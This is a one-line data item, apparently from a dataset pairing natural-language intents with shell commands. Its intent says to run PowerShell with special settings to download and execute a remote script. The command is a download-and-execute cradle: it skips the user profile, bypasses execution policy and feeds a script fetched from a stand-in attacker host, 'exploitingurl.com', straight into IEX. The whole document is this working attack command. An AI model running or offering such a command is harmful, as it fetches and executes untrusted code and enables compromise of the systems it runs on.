# Natural language intent:
# Execute PowerShell with specific settings to download and execute a script from a specified URL.

powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"
